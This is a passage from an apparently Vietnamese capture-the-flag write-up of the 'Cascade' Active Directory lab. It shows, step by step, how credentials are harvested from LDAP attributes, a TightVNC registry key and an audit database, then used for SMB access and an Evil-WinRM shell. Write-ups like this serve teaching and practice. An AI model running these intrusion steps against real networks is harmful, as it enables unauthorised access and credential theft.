</span></span><span class=line><span class=cl><span class=p>[-]</span> <span class=n>Kerberos</span> <span class=n>SessionError</span><span class=err>:</span> <span class=n>KDC_ERR_CLIENT_REVOKED</span><span class=p>(</span><span class=n>Clients</span> <span class=n>credentials</span> <span class=n>have</span> <span class=n>been</span> <span class=n>revoked</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[-]</span> <span class=n>User</span> <span class=n>arksvc</span> <span class=n>doesn</span><span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class=line><span class=cl><span class=s1>[-] User s.smith doesn&#39;</span><span class=n>t</span> <span class=n>have</span> <span class=n>UF_DONT_REQUIRE_PREAUTH</span> <span class=nb>set
</span></span></span><span class=line><span class=cl><span class=nb></span><span class=p>[-]</span> <span class=n>User</span> <span class=n>r</span><span class=p>.</span><span class=n>thompson</span> <span class=n>doesn</span><span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class=line><span class=cl><span class=s1>[-] User util doesn&#39;</span><span class=n>t</span> <span class=n>have</span> <span class=n>UF_DONT_REQUIRE_PREAUTH</span> <span class=nb>set
</span></span></span><span class=line><span class=cl><span class=nb></span><span class=p>[-]</span> <span class=n>User</span> <span class=n>j</span><span class=p>.</span><span class=n>wakefield</span> <span class=n>doesn</span><span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class=line><span class=cl><span class=s1>[-] User s.hickson doesn&#39;</span><span class=n>t</span> <span class=n>have</span> <span class=n>UF_DONT_REQUIRE_PREAUTH</span> <span class=nb>set
</span></span></span><span class=line><span class=cl><span class=nb></span><span class=p>[-]</span> <span class=n>User</span> <span class=n>j</span><span class=p>.</span><span class=n>goodhand</span> <span class=n>doesn</span><span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class=line><span class=cl><span class=s1>[-] User a.turnbull doesn&#39;</span><span class=n>t</span> <span class=n>have</span> <span class=n>UF_DONT_REQUIRE_PREAUTH</span> <span class=nb>set
</span></span></span><span class=line><span class=cl><span class=nb></span><span class=p>[-]</span> <span class=n>Kerberos</span> <span class=n>SessionError</span><span class=err>:</span> <span class=n>KDC_ERR_CLIENT_REVOKED</span><span class=p>(</span><span class=n>Clients</span> <span class=n>credentials</span> <span class=n>have</span> <span class=n>been</span> <span class=n>revoked</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[-]</span> <span class=n>Kerberos</span> <span class=n>SessionError</span><span class=err>:</span> <span class=n>KDC_ERR_CLIENT_REVOKED</span><span class=p>(</span><span class=n>Clients</span> <span class=n>credentials</span> <span class=n>have</span> <span class=n>been</span> <span class=n>revoked</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[-]</span> <span class=n>User</span> <span class=n>d</span><span class=p>.</span><span class=n>burman</span> <span class=n>doesn</span><span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class=line><span class=cl><span class=s1>[-] User BackupSvc doesn&#39;</span><span class=n>t</span> <span class=n>have</span> <span class=n>UF_DONT_REQUIRE_PREAUTH</span> <span class=nb>set
</span></span></span><span class=line><span class=cl><span class=nb></span><span class=p>[-]</span> <span class=n>User</span> <span class=n>j</span><span class=p>.</span><span class=n>allen</span> <span class=n>doesn</span><span class=err>&#39;</span><span class=n>t</span> <span class=n>have</span> <span class=n>UF_DONT_REQUIRE_PREAUTH</span> <span class=nb>set
</span></span></span><span class=line><span class=cl><span class=nb></span><span class=p>[-]</span> <span class=n>Kerberos</span> <span class=n>SessionError</span><span class=err>:</span> <span class=n>KDC_ERR_CLIENT_REVOKED</span><span class=p>(</span><span class=n>Clients</span> <span class=n>credentials</span> <span class=n>have</span> <span class=n>been</span> <span class=n>revoked</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[-]</span> <span class=n>Kerberos</span> <span class=n>SessionError</span><span class=err>:</span> <span class=n>KDC_ERR_CLIENT_REVOKED</span><span class=p>(</span><span class=n>Clients</span> <span class=n>credentials</span> <span class=n>have</span> <span class=n>been</span> <span class=n>revoked</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Đến đây thì thực sự bế tắc, lang thang trên mạng một hồi thì mình tìm thấy ở đây kiểm tra kết nối LDAP từ phía client
<a href=https://serverfault.com/questions/452935/how-to-test-a-ldap-connection-from-a-client>https://serverfault.com/questions/452935/how-to-test-a-ldap-connection-from-a-client</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Cascade ldapsearch -x -b <span class=s2>&#34;dc=cascade, dc=local&#34;</span> -h 10.10.10.182 &gt; ldapsearch.txt
</span></span></code></pre></td></tr></table></div></div><p>Do danh sách quá dài nên mình lưu vào file <code>ldapsearch.txt</code> để xem</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Cascade cat ldapsearch.txt<span class=p>|</span> grep <span class=s2>&#34;Pwd&#34;</span>
</span></span><span class=line><span class=cl>maxPwdAge: -9223372036854775808
</span></span><span class=line><span class=cl>minPwdAge: <span class=m>0</span>
</span></span><span class=line><span class=cl>minPwdLength: <span class=m>5</span>
</span></span><span class=line><span class=cl>badPwdCount: <span class=m>0</span>
</span></span><span class=line><span class=cl>maxPwdAge: -37108517437440
</span></span><span class=line><span class=cl>minPwdAge: <span class=m>0</span>
</span></span><span class=line><span class=cl>minPwdLength: <span class=m>0</span>
</span></span><span class=line><span class=cl>badPwdCount: <span class=m>0</span>
</span></span><span class=line><span class=cl>badPwdCount: <span class=m>0</span>
</span></span><span class=line><span class=cl>badPwdCount: <span class=m>0</span>
</span></span><span class=line><span class=cl>badPwdCount: <span class=m>0</span>
</span></span><span class=line><span class=cl>cascadeLegacyPwd: <span class=nv>clk0bjVldmE</span><span class=o>=</span>
</span></span></code></pre></td></tr></table></div></div><p>Ở đây mình nhận được 1 đoạn string <code>cascadeLegacyPwd: clk0bjVldmE=</code> có lẽ là passwd cũ hoặc passwd mặc định, sử dụng passwd này thử với tất cả user bên trên xem đăng nhập được với user nào không, đầu tiên phải decode passwd ra trước đã</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Cascade <span class=nb>echo</span> -n <span class=nv>clk0bjVldmE</span><span class=o>=</span> <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>rY4n5eva
</span></span></code></pre></td></tr></table></div></div><p>Đầu tiên mình thử với <code>Evil-WinRM</code> nhưng mà k hoạt động, sau đó mình thử với smb thì được 1 tài khoản <code>r.thompson</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Cascade sudo smbclient.py r.thompson:rY4n5eva@10.10.10.182
</span></span><span class=line><span class=cl>Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Type <span class=nb>help</span> <span class=k>for</span> list of commands
</span></span><span class=line><span class=cl><span class=c1># shares</span>
</span></span><span class=line><span class=cl>ADMIN$
</span></span><span class=line><span class=cl>Audit$
</span></span><span class=line><span class=cl>C$
</span></span><span class=line><span class=cl>Data
</span></span><span class=line><span class=cl>IPC$
</span></span><span class=line><span class=cl>NETLOGON
</span></span><span class=line><span class=cl>print$
</span></span><span class=line><span class=cl>SYSVOL
</span></span></code></pre></td></tr></table></div></div><p>Sau khi khám phá toàn bộ nội dung được shares trên smb, mình lấy được file <code>Meeting_Notes_June_2018.html</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>For anyone that missed yesterdays meeting (Im looking at
</span></span><span class=line><span class=cl>you Ben). Main points are below:<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span> <span class=na>class</span><span class=o>=</span><span class=s>MsoNormal</span><span class=p>&gt;&lt;</span><span class=nt>o:p</span><span class=p>&gt;</span><span class=ni>&amp;nbsp;</span><span class=p>&lt;/</span><span class=nt>o:p</span><span class=p>&gt;&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>-- New production network will be going live on
</span></span><span class=line><span class=cl>Wednesday so keep an eye out for any issues. <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>-- We will be using a temporary account to
</span></span><span class=line><span class=cl>perform all tasks related to the network migration and this account will be deleted at the end of
</span></span><span class=line><span class=cl>2018 once the migration is complete. This will allow us to identify actions
</span></span><span class=line><span class=cl>related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>-- The winner of the Best GPO competition will be
</span></span><span class=line><span class=cl>announced on Friday so get your submissions in soon.<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Và 1 file <code>VNC Install.reg</code> ở <code>\IT\Temp\s.smith</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Cascade cat VNC<span class=se>\ </span>Install.reg
</span></span><span class=line><span class=cl>Windows Registry Editor Version 5.00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\T</span>ightVNC<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\T</span>ightVNC<span class=se>\S</span>erver<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;ExtraPorts&#34;</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;QueryTimeout&#34;</span><span class=o>=</span>dword:0000001e
</span></span><span class=line><span class=cl><span class=s2>&#34;QueryAcceptOnTimeout&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;LocalInputPriorityTimeout&#34;</span><span class=o>=</span>dword:00000003
</span></span><span class=line><span class=cl><span class=s2>&#34;LocalInputPriority&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;BlockRemoteInput&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;BlockLocalInput&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;IpAccessControl&#34;</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;RfbPort&#34;</span><span class=o>=</span>dword:0000170c
</span></span><span class=line><span class=cl><span class=s2>&#34;HttpPort&#34;</span><span class=o>=</span>dword:000016a8
</span></span><span class=line><span class=cl><span class=s2>&#34;DisconnectAction&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;AcceptRfbConnections&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;UseVncAuthentication&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;UseControlAuthentication&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;RepeatControlAuthentication&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;LoopbackOnly&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;AcceptHttpConnections&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;LogLevel&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;EnableFileTransfers&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;RemoveWallpaper&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;UseD3D&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;UseMirrorDriver&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;EnableUrlParams&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;Password&#34;</span><span class=o>=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
</span></span><span class=line><span class=cl><span class=s2>&#34;AlwaysShared&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;NeverShared&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;DisconnectClients&#34;</span><span class=o>=</span>dword:00000001
</span></span><span class=line><span class=cl><span class=s2>&#34;PollingInterval&#34;</span><span class=o>=</span>dword:000003e8
</span></span><span class=line><span class=cl><span class=s2>&#34;AllowLoopback&#34;</span><span class=o>=</span>dword:00000000
</span></span><span class=line><span class=cl><span class=s2>&#34;VideoRecognitionInterval&#34;</span><span class=o>=</span>dword:00000bb8
</span></span></code></pre></td></tr></table></div></div><p>Chúng ta có thể thấy được đoạn</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=s2>&#34;Password&#34;</span><span class=o>=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
</span></span></code></pre></td></tr></table></div></div><p>Tuy nhiên đoạn hex passwd này được sử dụng với phần mềm TightVNC để lấy ra được passwd chính. Có thể sử dụng script ở đây <a href=https://github.com/trinitronx/vncpasswd.py>https://github.com/trinitronx/vncpasswd.py</a> hoặc sử dụng chương trình <code>vncpwd</code> download cho Windows tại đây <a href=http://aluigi.altervista.org/pwdrec/vncpwd.zip>http://aluigi.altervista.org/pwdrec/vncpwd.zip</a></p><p>Ở đây mình đang chạy windows nên chọn <code>vncpwd</code> chạy luôn cho lẹ</p><p><img loading=lazy src=https://images.viblo.asia/3ff339b8-9236-4283-be93-61dd13dbc677.png></p><p>Passwd là <code>sT333ve2</code><br>Do file này được lấy từ người dùng <code>s.smith</code> nên mình đã thử luôn passwd này với user này luôn với <code>Evil-WinRM</code>
Và chúng ta có user</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=err>➜</span>  <span class=n>Cascade</span> <span class=nb>evil-winrm</span> <span class=n>-u</span> <span class=n>s</span><span class=p>.</span><span class=n>smith</span> <span class=n>-p</span> <span class=n>sT333ve2</span> <span class=n>-i</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=py>182</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Evil-WinRM</span> <span class=n>shell</span> <span class=n>v2</span><span class=p>.</span><span class=py>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Info</span><span class=err>:</span> <span class=n>Establishing</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>remote</span> <span class=n>endpoint</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>s</span><span class=p>.</span><span class=n>smith</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>ls
</span></span></span><span class=line><span class=cl><span class=nb></span><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>s</span><span class=p>.</span><span class=n>smith</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>cd </span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>s</span><span class=p>.</span><span class=n>smith</span><span class=p>&gt;</span> <span class=nb>cd </span><span class=n>Desktop</span>
</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>s</span><span class=p>.</span><span class=n>smith</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span> <span class=nb>ls
</span></span></span><span class=line><span class=cl><span class=nb></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Directory</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>s</span><span class=p>.</span><span class=n>smith</span><span class=p>\</span><span class=n>Desktop</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Mode</span>                <span class=n>LastWriteTime</span>         <span class=n>Length</span> <span class=n>Name</span>
</span></span><span class=line><span class=cl><span class=p>----</span>                <span class=p>-------------</span>         <span class=p>------</span> <span class=p>----</span>
</span></span><span class=line><span class=cl><span class=n>-ar</span><span class=p>---</span>         <span class=mf>4</span><span class=p>/</span><span class=mf>8</span><span class=p>/</span><span class=mf>2020</span>   <span class=mf>4</span><span class=err>:</span><span class=mf>07</span> <span class=n>PM</span>             <span class=mf>34</span> <span class=n>user</span><span class=p>.</span><span class=py>txt</span>
</span></span><span class=line><span class=cl><span class=n>-a</span><span class=p>----</span>        <span class=mf>3</span><span class=p>/</span><span class=mf>25</span><span class=p>/</span><span class=mf>2020</span>  <span class=mf>11</span><span class=err>:</span><span class=mf>17</span> <span class=n>AM</span>           <span class=mf>1031</span> <span class=n>WinDirStat</span><span class=p>.</span><span class=py>lnk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>s</span><span class=p>.</span><span class=n>smith</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span> <span class=nb>cat </span><span class=n>user</span><span class=p>.</span><span class=py>txt</span>
</span></span><span class=line><span class=cl><span class=n>77d989cc96e4ab408eb522047a5ebe8c</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=get-root>Get Root<a hidden class=anchor aria-hidden=true href=#get-root>#</a></h2><p>Thử tìm kiếm xung quanh nhưng không phát hiện ra được gì nhiều, thử đăng nhập tài khoản s.smith với dịch vụ SMB xem có đang được chia sẻ dữ liệu gì không.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  ~ sudo smbclient.py s.smith:sT333ve2@10.10.10.182
</span></span><span class=line><span class=cl>Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>Type <span class=nb>help</span> <span class=k>for</span> list of commands
</span></span><span class=line><span class=cl><span class=c1># shares</span>
</span></span><span class=line><span class=cl>ADMIN$
</span></span><span class=line><span class=cl>Audit$
</span></span><span class=line><span class=cl>C$
</span></span><span class=line><span class=cl>Data
</span></span><span class=line><span class=cl>IPC$
</span></span><span class=line><span class=cl>NETLOGON
</span></span><span class=line><span class=cl>print$
</span></span><span class=line><span class=cl>SYSVOL
</span></span><span class=line><span class=cl><span class=c1># use Audit$</span>
</span></span><span class=line><span class=cl><span class=c1># ls</span>
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Thu Jan <span class=m>30</span> 01:01:26 <span class=m>2020</span> .
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Thu Jan <span class=m>30</span> 01:01:26 <span class=m>2020</span> ..
</span></span><span class=line><span class=cl>-rw-rw-rw-      <span class=m>13312</span>  Wed Jan <span class=m>29</span> 04:47:08 <span class=m>2020</span> CascAudit.exe
</span></span><span class=line><span class=cl>-rw-rw-rw-      <span class=m>12288</span>  Thu Jan <span class=m>30</span> 01:01:26 <span class=m>2020</span> CascCrypto.dll
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 04:43:18 <span class=m>2020</span> DB
</span></span><span class=line><span class=cl>-rw-rw-rw-         <span class=m>45</span>  Wed Jan <span class=m>29</span> 06:29:47 <span class=m>2020</span> RunAudit.bat
</span></span><span class=line><span class=cl>-rw-rw-rw-     <span class=m>363520</span>  Wed Jan <span class=m>29</span> 03:42:18 <span class=m>2020</span> System.Data.SQLite.dll
</span></span><span class=line><span class=cl>-rw-rw-rw-     <span class=m>186880</span>  Wed Jan <span class=m>29</span> 03:42:18 <span class=m>2020</span> System.Data.SQLite.EF6.dll
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 03:42:18 <span class=m>2020</span> x64
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 03:42:18 <span class=m>2020</span> x86
</span></span></code></pre></td></tr></table></div></div><p>Chúng ta lấy được chương trình <code>CaseAudit.exe</code> và thư viện <code>CascCrypto.dll</code> dùng để mã hoá. Trong thư mục DB cũng lấy được 1 file db sqlite3.</p><p>Nội dung file db</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Cascade sqlite3 Audit.db
</span></span><span class=line><span class=cl>SQLite version 3.31.1 2020-01-27 19:55:54
</span></span><span class=line><span class=cl>Enter <span class=s2>&#34;.help&#34;</span> <span class=k>for</span> usage hints.
</span></span><span class=line><span class=cl>sqlite&gt; .table
</span></span><span class=line><span class=cl>DeletedUserAudit  Ldap              Misc
</span></span><span class=line><span class=cl>sqlite&gt; <span class=k>select</span> * from DeletedUserAudit
</span></span><span class=line><span class=cl>   ...&gt; <span class=p>;</span>
</span></span><span class=line><span class=cl>6<span class=p>|</span>test<span class=p>|</span>Test
</span></span><span class=line><span class=cl>DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d<span class=p>|</span><span class=nv>CN</span><span class=o>=</span>Test<span class=se>\0</span>ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN<span class=o>=</span>Deleted Objects,DC<span class=o>=</span>cascade,DC<span class=o>=</span><span class=nb>local</span>
</span></span><span class=line><span class=cl>7<span class=p>|</span>deleted<span class=p>|</span>deleted guy
</span></span><span class=line><span class=cl>DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef<span class=p>|</span><span class=nv>CN</span><span class=o>=</span>deleted guy<span class=se>\0</span>ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN<span class=o>=</span>Deleted Objects,DC<span class=o>=</span>cascade,DC<span class=o>=</span><span class=nb>local</span>
</span></span><span class=line><span class=cl>9<span class=p>|</span>TempAdmin<span class=p>|</span>TempAdmin
</span></span><span class=line><span class=cl>DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a<span class=p>|</span><span class=nv>CN</span><span class=o>=</span>TempAdmin<span class=se>\0</span>ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN<span class=o>=</span>Deleted Objects,DC<span class=o>=</span>cascade,DC<span class=o>=</span><span class=nb>local</span>
</span></span><span class=line><span class=cl>sqlite&gt; <span class=k>select</span> * from Ldap<span class=p>;</span>
</span></span><span class=line><span class=cl>1<span class=p>|</span>ArkSvc<span class=p>|</span><span class=nv>BQO5l5Kj9MdErXx6Q6AGOw</span><span class=o>==</span><span class=p>|</span>cascade.local
</span></span><span class=line><span class=cl>sqlite&gt; <span class=k>select</span> * from Misc<span class=p>;</span>
</span></span><span class=line><span class=cl>sqlite&gt;
